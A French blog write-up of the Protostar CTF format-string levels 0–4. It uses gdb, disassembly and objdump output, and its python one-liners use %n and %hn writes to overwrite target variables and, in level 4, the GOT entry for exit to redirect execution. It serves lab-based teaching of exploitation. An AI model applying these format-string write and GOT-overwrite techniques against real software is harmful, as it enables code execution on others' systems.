# Solution du CTF Protostar (format string)

## Level 0

Le binaire prend un argument sur la ligne de commande et le passe à `sprintf` directement ce qui fait que l'on contrôle une chaine de format.

Je vous invite à lire [Pwing echo : Exploitation d'une faille de chaîne de format](https://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format) pour plus d'infos sur ce type de vulnérabilités.

Pour résoudre le challenge on dispose de cette indication :

> This level should be done in less than 10 bytes of input.

La fonction vulnérable laisse penser qu'on peut la solutionner avec un simple stack overflow :

```c
void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}
```

Toutefois on a une contrainte demandée qui nous force à utiliser une petite chaine de caractères. On se doute aussi qu'il faut s'en sortir avec une chaine de format :)

L'objectif est de parvenir à mettre la valeur  `0xdeadbeef` dans la variable `target`.

```
Breakpoint 1, vuln (string=0xffffced8 "AAAA") at format0/format0.c:15
15      in format0/format0.c
gdb-peda$ x/wx $ebp-0xc
0xffffcb4c:     0x00000000
```

Via `gdb` on voit que cette variable est à l'adresse `0xffffcb4c` sur la stack, en `ebp-0xc`.

```nasm
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x68
   0x080483fa <+6>:     mov    DWORD PTR [ebp-0xc],0x0
   0x08048401 <+13>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048404 <+16>:    mov    DWORD PTR [esp+0x4],eax  ; chaine de format du sprintf
   0x08048408 <+20>:    lea    eax,[ebp-0x4c]
   0x0804840b <+23>:    mov    DWORD PTR [esp],eax  ; destination du sprintf
   0x0804840e <+26>:    call   0x8048300 <sprintf@plt>
   0x08048413 <+31>:    mov    eax,DWORD PTR [ebp-0xc]
=> 0x08048416 <+34>:    cmp    eax,0xdeadbeef
   0x0804841b <+39>:    jne    0x8048429 <vuln+53>
   0x0804841d <+41>:    mov    DWORD PTR [esp],0x8048510
   0x08048424 <+48>:    call   0x8048330 <puts@plt> ; prints "you have hit the target correctly :)"
   0x08048429 <+53>:    leave  
   0x0804842a <+54>:    ret    
End of assembler dump.
```

Et notre buffer destination utilisé par `sprintf` est à `ebp-0x4c`. Il y a 64 octets entre notre buffer et la variable `target` :

```python
>>> 0x4c - 0xc
64
```

On va donner à `sprintf` une chaine de format qui va représenter des données sur 64 octets puis placer la valeur attendue juste derrière :

```shellsession
user@protostar:/opt/protostar/bin$ ./format0 `python -c 'import struct; print "%64x" + struct.pack("<I", 0xdeadbeef)'`
you have hit the target correctly :)
```

Ca marche. `sprintf` a utilisé le format `%64x` et a représenté sur 64 octets (via du padding) la première valeur qu'il a trouvé sur la stack (ce qu'il y a ne nous intéresse pas ici). Les 4 derniers octets ont alors écrasé la variable comme il fallait.

## Level 1

Le binaire correspond à ce code C :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Et on dispose d'un indice :

> objdump -t is your friend, and your input string lies far up the stack :)

Je peux placer un breakpoint dans la fonction `vuln` et observer où notre buffer se trouve dans la stack :

```
(gdb) b *0x0804841b
Breakpoint 1 at 0x804841b: file format1/format1.c, line 15.
(gdb) r `python -c 'import struct; print "AAAA%142$08x"'`
Starting program: /opt/protostar/bin/format1 `python -c 'import struct; print "AAAA%142$08x"'`

Breakpoint 1, 0x0804841b in vuln (string=0x2 <Address 0x2 out of bounds>) at format1/format1.c:15
15      format1/format1.c: No such file or directory.
        in format1/format1.c
(gdb) x/64wx $esp
0xbffff77c:     0x08048435      0xbffff97c      0xb7ff1040      0x0804845b
0xbffff78c:     0xb7fd7ff4      0x08048450      0x00000000      0xbffff818
--- snip ---
0xbffff96c:     0x2f726174      0x2f6e6962      0x6d726f66      0x00317461
(gdb) 
0xbffff97c:     0x41414141      0x32343125      0x78383024      0x45535500
```

Effectivement il faut 512 octets avant d'attendre le début de notre chaine soit 128 dwords.

Il faut jouer un peu avec le padding mais en me servant du format `%<position>$08x` je retrouve bien mes données en 129ème position sur la stack :

```shellsession
user@protostar:/opt/protostar/bin$ ./format1 `python -c 'import struct; print "pAAAAp%129$08x"'`
pAAAAp41414141
```

On voit bien le `41414141` correspondant à nos `AAAA` en hexadécimal.

L'adresse de la variable `target` se retrouve dans l'output de `objdump` :

```shellsession
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
```

Le code attend juste que la variable soit modifiée (différente de zéro). On doit utiliser le format `%n` qui indique à `printf` d'écrire en mémoire un entier correspondant au nombre de caractères qu'il a affiché. Associé à l'indicateur de position on lui dit d'écrire à l'adresse contenue à la 129ème position sur la stack (adresse sous notre contrôle puisqu'on la reflétée en hexa plus tôt).

```shellsession
user@protostar:/opt/protostar/bin$ ./format1 `python -c 'import struct; print "p" + struct.pack("<I", 0x08049638) + "p%129$08n"'`
p8pyou have modified the target :)
```

Bingo ! On a du écrire 6 octets dans la variable, ce qui suffit à passer l'épreuve.

## Level 2

Toujours une variable à écraser mais cette fois une valeur spécifique est attendue.

```
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
```

Autre particularité, la lecture se fait via l'entrée standard :

```shellsession
user@protostar:/opt/protostar/bin$ ./format2 
AAAA%4$8x
AAAA41414141
target is 0 :(
```

On doit placer la valeur `64` dans `target`. On place donc l'adresse de `target` suivie de 60 caractères `A` puis le format d'écriture de caractères lus :

```shellsession
user@protostar:/opt/protostar/bin$ python -c 'import struct; print struct.pack("<I", 0x080496e4) + "A"*60 + "%4$n"' > /tmp/input
user@protostar:/opt/protostar/bin$ ./format2 < /tmp/input 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have modified the target :)
```

## Level 3

Toujours grosso-modo la même chose mais cette fois la valeur à écraser est bien plus grosse et seulement 512 octets maximum sont lus sur l'entrée standard :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Je peux placer un breakpoint dans `printbuffer` au moment du `printf` pour observer la pile. J'obtiens ainsi une indication de où se trouve mon buffer pour ajuster la position dans ma chaine de format.

Notez qu'on pourrait aussi l'obtenir via brute force en relançant le binaire autant de fois que nécessaire.

```
user@protostar:/opt/protostar/bin$ ./format3
AAAA%12$08x
AAAA41414141
target is 00000000 :(
```

Au lieu d'écraser le dword complet en mémoire, on va écraser deux shorts (16 bits). L'un pour les octets de poids fort de la variable `target` et l'autre pour ceux de poids faible. On le fait avec le format `%hn`.

La valeur attendue est `0x01025544`. Une moitiée correspond à la valeur 258 et l'autre à 21828 :

```python
>>> import struct
>>> struct.pack("<I", 0x01025544)
b'DU\x02\x01'
>>> struct.unpack("<H", b"\x02\x01")
(258,)
>>> struct.unpack("<H", b"DU")
(21828,)
```

On choppe la valeur de `target` :

```
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
```

Commençons par écrire les octets de poids forts (on commence toujours par la valeur la plus petite et dans ce cas précis ce sont les octets de poids forts) :

```shellsession
user@protostar:/opt/protostar/bin$ python -c 'import struct; print struct.pack("<I", 0x080496f4+2) + "A" * 254 + "%12$hn"' > /tmp/input 
user@protostar:/opt/protostar/bin$ ./format3 < /tmp/input 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
target is 01020000 :(
```

Ca fonctionne. On part donc sur les octets de poids faible. Il faut penser à retrancher des 21828 octets le nombre de caractères qui ont été affichés précédemment :

```shellsession
user@protostar:/opt/protostar/bin$ python -c 'import struct; print struct.pack("<I", 0x080496f4+2) + struct.pack("<I", 0x080496f4)+ "A" * 250 + "%12$hn" + "%021570x" + "%13$hn"' > /tmp/input 
user@protostar:/opt/protostar/bin$ ./format3 < /tmp/input 
��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA--- snip ---00000000000000000
you have modified the target :)
```

## Level 4

Cette fois plus de variable à écraser, il faut faire exécuter une fonction `hello` présente dans le code. On a un indice consistant à faire afficher les relocations :

> objdump -TR is your friend

Seul la fonction `exit` est intéressante car appellée après la fonction `printf` vulnérable.

```shellsession
user@protostar:/opt/protostar/bin$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

Donc `0x08049724` est l'adresse de `exit` dans la `GOT` et `0x080484b4` est l'adresse de `hello`. On trouve l'offset de notre buffer :

```shellsession
user@protostar:/opt/protostar/bin$ ./format4 
AAAA%4$08x
AAAA41414141
```

La bonne nouvelle c'est que l'adresse de `exit` dans la `GOT` commence déjà par `0x0804` qui est commun à l'adresse de `hello`. Il nous suffit d'écraser les deux octets de poids faible.

```
(gdb) x/wx 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2
```

`0x84b4 - 4` donne `33968`. C'est ce qu'il faut écrire après les 4 octets de l'adresse :

```shellsession
user@protostar:/opt/protostar/bin$ python -c 'import struct; print struct.pack("<I", 0x08049724) + "%33968x" + "%4$hn"' > /tmp/input 
user@protostar:/opt/protostar/bin$ ./format4 < /tmp/input
--- snip ---
code execution redirected! you win
```

Il ne reste que les 3 binaires `final` et ce sera terminé pour ce `Protostar` :)

*Publié le 26 janvier 2023*
